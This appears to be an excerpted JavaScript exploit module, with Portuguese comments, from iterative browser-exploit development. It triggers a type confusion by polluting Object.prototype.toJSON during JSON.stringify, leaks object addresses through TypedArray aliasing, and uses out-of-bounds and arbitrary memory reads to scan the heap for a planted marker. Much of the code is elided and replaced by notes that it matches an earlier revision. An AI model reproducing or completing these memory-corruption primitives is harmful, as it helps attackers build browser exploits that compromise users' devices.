// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R35)

import { logS3, PAUSE_S3 } from './s3_utils.mjs'; // PAUSE_S3 daqui agora funciona corretamente
...
const SCAN_MARKER_VALUE_R35 = new AdvancedInt64(0x41424344, 0x45464748); 
const SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R35 = 0x100; 
const SCAN_HEAP_START_ADDRESS_R35 = new AdvancedInt64(0x0, 0x8A000000); 
const SCAN_HEAP_END_ADDRESS_R35 = new AdvancedInt64(0x0, 0x8A020000); 
const SCAN_STEP_R35 = 0x1000; 

function advInt64LessThanOrEqual(a, b) { /* ... (como na R34) ... */
...
export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R35() { 
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R35`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + Memory Scan (R35) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R35...`;

    let iteration_results_summary = [];
    let best_result_for_runner = { /* ... (como na R34) ... */
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        memory_scan_result: { success: false, msg: "Memory scan (R35): Not run.", found_at_address: null, oob_buffer_base_addr: null },
    ...
    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        ...
        logS3(`\n===== ITERATION R35: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);
        ...
        const current_object_to_leak_A = { marker_A_R35: `LeakA_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        const current_object_to_leak_B = { marker_B_R35: `LeakB_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        
        function toJSON_TA_Probe_Iter_Closure_R35() { /* ... (lógica da sonda como na R34, apenas atualizando logs para R35) ... */ 
            ...
            logS3(`[PROBE_R35] Call #${call_num}.'this':${ctts}.IsM2C?${is_m2c}.TCFlag:${iteration_tc_first_detection_done}`,"leak");
            try{if(call_num>PROBE_CALL_LIMIT_V82)return{r_stop:"limit"};if(call_num===1&&this===victim_typed_array_ref_iter){marker_M2_ref_iter={marker_id_v82:"M2_Iter_R35"};marker_M1_ref_iter={marker_id_v82:"M1_Iter_R35",payload_M2:marker_M2_ref_iter};return marker_M1_ref_iter;}else if(is_m2c){if(!iteration_tc_first_detection_done){iteration_tc_first_detection_done=true;iteration_final_tc_details_from_probe={call_number_tc_detected:call_num,probe_variant:"TA_Probe_R35",this_type:"[object Object]",this_is_M2:true,getter_defined:false,direct_prop_set:false,getter_fired:false,leak_val_getter_int64:null,leak_val_getter_is_ptr:false,error_probe:null};logS3(`[PROBE_R35] Call #${call_num} (M2C): FIRST TC. Details obj CREATED. ID:${this.marker_id_v82}`,"vuln");}
            ...
            let lvf=NaN,lis="getter_err_r35";try{let vfv=new Float64Array(victim_typed_array_ref_iter.buffer);let vu32=new Uint32Array(victim_typed_array_ref_iter.buffer);const o0=vu32[0],o1=vu32[1];vfv[0]=current_object_to_leak_A;lvf=vfv[0];const llo=vu32[0],lhi=vu32[1];lis=new AdvancedInt64(llo,lhi).toString(true);vu32[0]=o0;vu32[1]=o1;if(det)det.leak_val_getter_int64=lis;logS3(`[PROBE_R35] Getter: Leaked Int64: ${lis}`,"leak");const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan&&lhi!==0){if((lhi>=0xFFFF0000)||(lhi>0&&lhi<0xF0000)||(lhi>=0x100000&&lhi<0x7F000000)){if(det)det.leak_val_getter_is_ptr=true;return lvf;}}
        ...
        // ... (Resto da função execute... como na R34, apenas atualizando nomes de log e o nome da função da sonda)
        // O código foi omitido aqui por brevidade, pois é idêntico à R34 exceto pelos identificadores R35 e uso de PAUSE_S3.
        // Certifique-se de usar toJSON_TA_Probe_Iter_Closure_R35 ao poluir Object.prototype.toJSON.
        // E a chamada no loop de scan agora usa await PAUSE_S3(0);
        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null; 
        let iter_memory_scan_result = { success: false, msg: "Memory scan (R35): Not run.", found_at_address: null, oob_buffer_base_addr: null };
        let heisenbugConfirmedThisIter = false; 
        
        try { 
            logS3(`  --- Fase 1 (R35): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
            ...
            try {
                Object.defineProperty(Object.prototype,ppKey,{value:toJSON_TA_Probe_Iter_Closure_R35,writable:true,configurable:true,enumerable:false}); polluted=true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                logS3(`  TC Probe R35: JSON.stringify Raw: ${iter_raw_stringify_output ? iter_raw_stringify_output.substring(0,200) + "..." : "N/A"}`, "info");
                ...
                if(iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2){
                    heisenbugConfirmedThisIter=true; logS3(`  TC Probe R35: TC on M2 CONFIRMED. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "vuln");
                ...
                }else{logS3(` TC Probe R35: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");}
            ...
            logS3(`  --- Fase 1 (R35) Concluída. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
            await PAUSE_S3(100);
            logS3(`  --- Fase 2 (R35): Teste de Memory Scan ---`, "subtest", FNAME_CURRENT_ITERATION);
            if (heisenbugConfirmedThisIter) { 
                try {
                    ...
                    logS3(`  MemScan: Plantando marcador ${SCAN_MARKER_VALUE_R35.toString(true)} em oob_array_buffer_real[${toHex(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R35)}]...`, 'info');
                    oob_write_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R35, SCAN_MARKER_VALUE_R35, 8);
                    const verify_marker = oob_read_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R35, 8);
                    if (!verify_marker.equals(SCAN_MARKER_VALUE_R35)) {
                    ...
                    for (let current_scan_addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS_R35.low(), SCAN_HEAP_START_ADDRESS_R35.high()); 
                         advInt64LessThanOrEqual(current_scan_addr, SCAN_HEAP_END_ADDRESS_R35); 
                         current_scan_addr = current_scan_addr.add(SCAN_STEP_R35)) {
                        if (current_scan_addr.low() % (SCAN_STEP_R35 * 20) === 0) {logS3(`  MemScan: Escaneando em ${current_scan_addr.toString(true)}...`, 'debug');}
                        try { 
                            const value_at_addr = await arb_read(current_scan_addr, 8); 
                            if (isAdvancedInt64Object(value_at_addr) && value_at_addr.equals(SCAN_MARKER_VALUE_R35)) {
                                ...
                                iter_memory_scan_result.oob_buffer_base_addr = found_marker_addr.sub(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R35).toString(true);
                            ...
                            if (current_scan_addr.low() % (SCAN_STEP_R35 * 50) === 0) { 
                                logS3(`  MemScan: Erro ao ler/processar ${current_scan_addr.toString(true)}: ${e_scan_read.name} - ${e_scan_read.message}`, 'warn');
                            }
                        }
                        await PAUSE_S3(0); // <<<< CORRIGIDO AQUI >>>>
                    }
                    if (!found_marker_addr) iter_memory_scan_result.msg = `MemScan: Marcador não encontrado na faixa ${SCAN_HEAP_START_ADDRESS_R35.toString(true)} - ${SCAN_HEAP_END_ADDRESS_R35.toString(true)}.`;
                } catch (e_mem_scan) {
            ...
            logS3(`  --- Fase 2 (R35) Concluída. Memory Scan Sucesso: ${iter_memory_scan_result.success} ---`, "subtest");

        }catch(e_outer){if(!iter_primary_error)iter_primary_error=e_outer; logS3(`  CRITICAL ERROR ITERATION R35: ${e_outer.message || String(e_outer)}`, "critical");}
        finally{clearOOBEnvironment({caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR35`});}

        final_probe_call_count_for_report = probe_call_count_iter;
        
        let current_iter_summary = { /* ... (como na R30) ... */ 
        ...
        // Lógica para best_result_for_runner (R35)
        let tc_ok_this_iter = heisenbugConfirmedThisIter;
        let scan_successful_this_iter = iter_memory_scan_result.success;
        let current_score = 0; if (scan_successful_this_iter) current_score = 2; else if (tc_ok_this_iter) current_score = 1;
        let best_score = 0; if (best_result_for_runner.memory_scan_result?.success) best_score = 2; else if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) best_score = 1;
        ...
        if(scan_successful_this_iter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R35: Scan OK!`;
        else if(tc_ok_this_iter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R35: TC OK`;
        else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R35: Iter Done`;
        await PAUSE_S3(250);
    } 
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R35): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return { 
